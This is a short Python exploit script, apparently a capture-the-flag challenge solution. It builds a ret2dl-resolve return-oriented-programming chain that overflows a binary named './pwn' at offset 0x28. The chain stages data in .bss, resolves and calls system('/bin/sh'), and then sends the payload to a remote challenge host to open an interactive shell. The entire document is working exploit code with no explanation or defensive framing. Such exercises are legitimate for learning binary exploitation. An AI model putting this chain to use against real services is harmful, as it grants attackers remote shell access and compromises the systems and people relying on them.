#!/usr/bin/env python
from pwn import remote,context
from roputils import *
# from pwn import gdb
# context.arch='i386'
# context.arch='amd64'
# context.log_level='debug'


fpath = './pwn'
offset = 0x28

rop = ROP(fpath)
addr_bss = rop.section('.bss')

buf1 = rop.retfill(offset)
buf1 += rop.call('read', 0, addr_bss, 100)
buf1 += rop.dl_resolve_call(addr_bss+20, addr_bss)

# p = Proc(rop.fpath)
# p.write(p32(len(buf)) + buf)
# print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)
# p.write(buf)
# p.interact(0)

# from pwn import *
p=remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com',33865)
context.log_level='debug'
p.send(p32(len(buf1))+buf1)
# sleep(1)
p.send(buf)

# p.interact(0)
p.interactive()